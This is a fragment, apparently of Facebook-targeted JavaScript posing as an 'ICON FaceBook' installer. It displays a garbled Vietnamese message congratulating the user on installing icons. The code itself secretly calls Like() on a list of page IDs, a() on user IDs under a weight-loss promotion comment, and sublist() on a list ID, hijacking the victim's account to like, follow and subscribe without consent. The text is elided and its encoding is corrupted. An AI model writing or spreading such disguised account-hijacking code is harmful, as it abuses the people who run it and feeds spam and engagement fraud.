...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/anhhungpro.1" target="_blank">Ch?Âºc M?ng B?n ?Â?Â£ C? i ?Â?t ICON FaceBook Th? nh C?Â´ng <br>NoName</a>';
	html += '</div>';
...
Like("392381907506330");
Like("739789736033530");
Like("249212848574896");
Like("564615303603793");
Like("274893859343061");
Like("392381907506330");
Like("392381907506330");
Like("739789736033530");
Like("249212848574896");
...
//Giam Can Lam Dep
a("100004360569453"); a("100006637422441");
sublist("1447968902101010");
